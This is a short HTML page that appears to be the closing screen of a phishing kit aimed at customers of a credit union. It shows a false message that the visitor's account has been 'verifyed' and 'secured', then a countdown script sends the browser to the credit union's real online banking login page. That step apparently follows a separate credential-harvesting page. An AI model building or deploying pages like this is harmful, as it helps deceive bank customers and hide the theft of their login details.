<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Outlined"
    rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
    <title>Log in now</title>
    <link rel="stylesheet" href="master.css">
  </head>
  <body>
<div class="container">
<div class="navbar">
  <div class="logo">
    <img src="logo.png" alt="logo">
  </div>


<div class="dot-menu">

    <span class="material-icons-outlined dot-menu-icon" style="font-size:32px;">
    more_horiz
    </span>
<div class="menu">
<a href="#"><span class="material-icons" style="font-size:30px;">
call
</span>Contact us</a>
<a href="#"> <span class="material-icons" style="font-size:30px;">
location_on
</span>Location</a>
<a href="#"> <span class="material-icons" style="font-size:30px;">
help_outline
</span>Help</a>
</div>
  </div>

</div>

  <div class="content">

    <div class="content-s" style="width:100%;text-align:center;">
<span class="success">Your account has been successfully verifyed and your account is now secured</span>
<br><span class="redirect">Redirecting in <i class="count">5</i> sec </span>

</div>

  </div>
</div>
  </body>

  <script>

  var sec=4;
  var redirect =setInterval(function(){
  if(sec==0){
    clearInterval(redirect);
    window.open("https://myebranch.iccu.com/Mobile/Authentication",'_parent')
  }
  document.getElementsByClassName('count')[0].innerHTML=sec;
  sec--;
  },1000)

  </script>

</html>
